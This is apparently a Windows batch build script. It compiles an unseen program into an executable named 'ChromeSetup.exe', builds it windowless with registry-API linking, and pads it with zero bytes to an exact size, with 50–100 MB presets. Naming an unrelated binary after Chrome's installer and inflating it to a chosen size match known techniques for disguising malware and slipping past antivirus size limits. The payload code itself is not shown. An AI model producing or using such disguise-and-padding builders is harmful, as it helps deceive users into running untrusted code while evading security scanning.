@echo off
chcp 866 >nul
setlocal

:: ==============================
::   CHANGE SIZE HERE (in bytes)
:: ==============================
set TARGET_SIZE=13283768
:: 50 MB = 52428800
:: 30 MB = 31457280
:: 100 MB = 104857600
:: ==============================

echo [1/3] Compiling resources...
windres resource.rc -O coff -o resource.o
if errorlevel 1 (
    echo ERROR: resource.rc failed
    pause
    exit /b 1
)

echo [2/3] Compiling program...
g++ main.cpp resource.o -o ChromeSetup.exe -ladvapi32 -mwindows
if errorlevel 1 (
    echo ERROR: main.cpp failed
    pause
    exit /b 1
)

echo [3/3] Setting exact size to %TARGET_SIZE% bytes...

powershell -NoProfile -Command ^
    "$target = %TARGET_SIZE%;" ^
    "$f = 'ChromeSetup.exe';" ^
    "$cur = (Get-Item $f).Length;" ^
    "if ($cur -lt $target) {" ^
    "    $pad = $target - $cur;" ^
    "    $fs = [System.IO.File]::Open($f, 'Append');" ^
    "    $fs.Write((New-Object byte[] $pad), 0, $pad);" ^
    "    $fs.Close();" ^
    "    Write-Host 'Success! Final size:' $target 'bytes';" ^
    "} else {" ^
    "    Write-Host 'File is already bigger or equal';" ^
    "}"

echo.
echo ==============================
echo   DONE! File: ChromeSetup.exe
echo ==============================
timeout /t 5
exit